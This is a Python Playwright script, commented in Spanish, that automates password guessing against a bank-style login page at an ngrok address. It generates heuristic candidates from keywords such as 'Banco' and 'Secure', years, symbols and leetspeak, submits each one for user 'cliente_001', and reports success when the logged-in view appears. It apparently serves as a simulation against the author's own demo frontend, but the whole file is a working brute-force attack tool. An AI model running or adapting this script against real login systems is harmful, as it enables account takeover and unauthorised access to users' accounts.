import asyncio
import time
from playwright.async_api import async_playwright

HTML_URL = "https://statue-essential-dirtiness.ngrok-free.dev"  # la URL donde corre tu frontend
TARGET_USER = "cliente_001"

# Generación heurística de contraseñas
CONTEXT_KEYWORDS = ["Banco", "Secure"]
YEARS = ["2024", "2026"]
SYMBOLS = ["$", "#"]

def generate_passwords():
    generated = set()
    for base in CONTEXT_KEYWORDS:
        for yr in YEARS:
            for sym in SYMBOLS:
                leet = base.replace('e', '3').replace('s', '$')
                generated.add(f"{base}{yr}")
                generated.add(f"{leet}{sym}{yr}")
                generated.add(f"Banco$ecure#{yr}")
    return list(generated)

async def run_gui_adaptive_bot():
    candidates = generate_passwords()
    print(f"🤖 [BOT GUI] Iniciando simulación visual con {len(candidates)} candidatas...")

    async with async_playwright() as p:
        # headless=False abre la ventana del navegador para que veas la interacción
        browser = await p.chromium.launch(headless=False, slow_mo=50)
        page = await browser.new_page()

        for attempt, pwd in enumerate(candidates, 1):
            print(f"🤖 Intento {attempt}: Ingresando contraseña '{pwd}'...")
            
            # 1. Abre o recarga la página de inicio
            await page.goto(HTML_URL)

            # 2. Llena los campos en la interfaz
            await page.fill("#username", TARGET_USER)
            await page.fill("#password", pwd)
            
            # 3. Hace clic en el botón de login
            await page.click("#btnLogin")
            
            # Espera breve para verificar si la interfaz cambió o si dio error
            await page.wait_for_timeout(1000)

            # Si el elemento de la vista post-login aparece, el ataque tuvo éxito
            if await page.is_visible("#viewTxn"):
                print(f"✅ ¡Éxito en la interfaz! Contraseña correcta: '{pwd}'")
                await page.wait_for_timeout(3000)
                await browser.close()
                return

            print(f"❌ Intento {attempt} fallido en la interfaz.")

        await browser.close()

if __name__ == "__main__":
    asyncio.run(run_gui_adaptive_bot())